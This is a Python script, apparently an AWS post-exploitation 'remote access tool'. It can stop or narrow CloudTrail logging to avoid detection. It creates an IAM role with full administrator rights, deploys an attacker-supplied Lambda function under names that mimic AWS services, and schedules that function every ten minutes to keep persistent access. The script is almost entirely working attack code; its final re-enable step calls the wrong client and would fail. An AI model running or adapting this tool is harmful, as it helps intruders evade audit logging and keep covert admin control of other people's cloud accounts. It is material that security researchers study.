# TODO: Add CloudWatch Events to filter out our logs

#!/usr/bin/env python

import sys
import boto3
import readline
import botocore
import argparse
import zipfile
import io
import json
import time
import os

policyarn='arn:aws:iam::aws:policy/AdministratorAccess'

def dot():
    sys.stdout.write('.')
    sys.stdout.flush()

def getAllPaginated(client_function, list_key, **kwargs):
    returned_object = client_function(**kwargs)
    result = returned_object[list_key]
    isTruncated = returned_object['IsTruncated']
    while isTruncated:
        returned_object = client_function(Marker=returned_object['Marker'])
        result = result + returned_object[list_key]
        isTruncated = returned_object['IsTruncated']
    return result

parser = argparse.ArgumentParser(description='Long-Evans AWS Remote Access Tool', epilog='Github: https://github.com/cxxr/long-evans')
parser.add_argument('--region', default='us-west-2', help='Which region to set the default client to. Default: us-west-2')
parser.add_argument('--disable-logging', default=False, action='store_true', help='Disables CloudTrail logging')
parser.add_argument('--re-enable-logging', default=True, action='store_true', help='Re-enables CloudTrail logging after disabling')
parser.add_argument('--source', default='handler.py', help='Which python file to use as the lambda')
parser.add_argument('--runtime', default='python2.7', help='Python runtime to use, either python2.7 or python3.6')
parser.add_argument('--handler', default='lambda_handler', help='Which function in the Python file to call in AWS Lambda')
parser.add_argument('--role-name', default='CloudTrail-Handler', help='The name of the admin role to create')
parser.add_argument('--function-name', default='CloudTrail-Handler-Function', help='The name of the lambda function to create')
parser.add_argument('--rule-name', default='CloudFormation-Rule', help='The name of the CloudWatch Events rule to create')
parser.add_argument('--delete', default=False, action='store_true', help='Tries to undo long-evans in this account')

args = parser.parse_args()

region = args.region

if args.delete:
    # Delete the rule targets
    try:
        client = boto3.client('events', region_name=region)
        print "client.remove_targets: {}".format(client.remove_targets(Rule=args.rule_name, Ids=[args.rule_name + '-ID1']))
    except Exception as e:
        print "Caught e: {}".format(e)
        pass

    # Delete the rule
    try:
        print "client.delete_rule: {}".format(client.delete_rule(Name=args.rule_name))
    except Exception as e:
        print "Caught e: {}".format(e)
        pass

    # Delete the function
    try:
        client = boto3.client('lambda', region_name=region)
        print "client.delete_function: {}".format(client.delete_function(FunctionName=args.function_name))
    except Exception as e:
        print "Caught e: {}".format(e)
        pass

    client = boto3.client('iam', region_name=region)
    # Detach the policy
    try:
        print "client.detach_role_policy: {}".format(client.detach_role_policy(RoleName=args.role_name, PolicyArn=policyarn))
    except Exception as e:
        print "Caught e: {}".format(e)
        pass

    # Delete the role
    try:
        client = boto3.client('iam', region_name=region)
        print "client.delete_role: {}".format(client.delete_role(RoleName=args.role_name))
    except Exception as e:
        print "Caught e: {}".format(e)
        pass
else:
    # Try and disable CloudTrail
    multiregionDisableSuccessful = False
    cloudTrailRegions = set()
    if args.disable_logging:
        client = boto3.client('cloudtrail', region_name=region)
        trails = client.describe_trails(includeShadowTrails=True)
        for trail in trails['trailList']:
            arn = trail['TrailARN']
            trailRegion = trail['HomeRegion']
            print trail
            client = boto3.client('cloudtrail', region_name=trailRegion)
            try:
                print "client.update_trail: {}".format(client.update_trail(Name=arn, IsMultiRegionTrail=False, IncludeGlobalServiceEvents=False))
                multiregionDisableSuccessful = True
                cloudTrailRegions.add(trailRegion)
            except botocore.exceptions.ClientError as e:
                if e.response['Error']['Code'] == 'InternalFailure':
                    print "client.stop_logging: {}".format(client.stop_logging(Name=arn))
                else:
                    print "Got unexpected response: {}".format(e.response)

    # Find IAM role appropriate, or create our own

    assume_role = {
        'Version':'2012-10-17',
        'Statement': [{
            'Effect': 'Allow',
            'Principal': {
                'Service': 'lambda.amazonaws.com'
            },
            'Action': 'sts:AssumeRole'
        },{
            'Effect': 'Allow',
            'Principal': {
                'Service': 'events.amazonaws.com'
            },
            'Action': 'sts:AssumeRole'
        }]
    }

    # Create an admin role
    client = boto3.client('iam', region_name=region)
    role = client.create_role(RoleName=args.role_name,
                AssumeRolePolicyDocument=json.dumps(assume_role))

    print "Waiting 1 second..."
    time.sleep(1)

    print role
    print client.attach_role_policy(
        RoleName=role['Role']['RoleName'],
        PolicyArn=policyarn
    )

    rolearn = role['Role']['Arn']
    print "RoleARN: {}".format(rolearn)

    # Create the Lambda function
    zipbytes = io.BytesIO()
    with zipfile.ZipFile(zipbytes, 'w') as zf:
        zf.write(args.source)

    zipbytes.seek(0)

    client = boto3.client('lambda', region_name=region)

    print "Waiting..."

    time.sleep(60)

    filename, file_ext = os.path.splitext(args.handler)

    for x in range(1, 10):
        try:
            response = client.create_function(
                FunctionName=args.function_name,
                Runtime=args.runtime,
                Role=rolearn,
                Handler=filename + '.' + args.handler,
                Code={
                    'ZipFile':zipbytes.read()
                },
                Publish=True
            )
            break
        except:
            dot()
            time.sleep(10 * x)
            pass
    else:
        print "Couldn't create the lambda function"
        sys.exit(-1)

    print response

    # Schedule the lambda for once every 10 minutes
    client = boto3.client('events', region_name=region)
    rule = client.put_rule(Name=args.rule_name, ScheduleExpression='rate(10 minutes)', State='ENABLED', RoleArn=rolearn)

    print rule

    target = client.put_targets(
        Rule=args.rule_name,
        Targets=[{
            'Id': args.rule_name + '-ID1',
            'Arn': response['FunctionArn']
        }]
    )

    print target

    # Re-enable CloudTrail if we disabled it
    if args.disable_logging and args.re_enable_logging:
        print "client.start_logging: {}".format(client.start_logging(Name=arn))

